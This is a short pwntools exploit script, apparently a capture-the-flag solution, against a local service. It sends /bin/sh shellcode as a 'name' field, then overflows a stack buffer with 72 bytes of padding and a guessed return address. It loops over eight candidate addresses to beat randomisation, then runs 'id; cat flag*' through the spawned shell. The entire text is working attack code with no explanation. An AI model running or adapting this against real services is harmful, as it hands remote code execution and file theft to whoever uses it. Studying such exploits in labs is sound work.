

from pwn import *
context.arch='amd64'; context.log_level='info'
HOST,PORT="127.0.0.1",62697

shellcode = asm(shellcraft.amd64.linux.sh())
assert len(shellcode) <= 64
shellcode = shellcode.ljust(64, b'\x90')

for mrnd in range(8):
    addr = ((mrnd % 8) + 0x20) << 12
    log.info(f"MRND={mrnd} addr=0x{addr:x}")
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(b'name: ')
        r.send(shellcode)
        sleep(0.1)
        r.recvuntil(b'overflow me~')
        r.recvline()
        payload = b'A' * 72 + p64(addr) + b'\n'
        r.send(payload)
        sleep(0.3)
        r.sendline(b'id; cat flag* /flag* 2>&1')
        sleep(0.5)
        data = r.recvall(timeout=3)
        print(f"  Response: {data[:200]}")
        if data and b'uid=' in data or b'flag' in data.lower() or b'AAA' in data:
            log.success(f"GOT IT! mrnd={mrnd}")
            print(data.decode(errors='replace'))
            exit(0)
        r.close()
    except Exception as e:
        log.warning(f"Error: {e}")
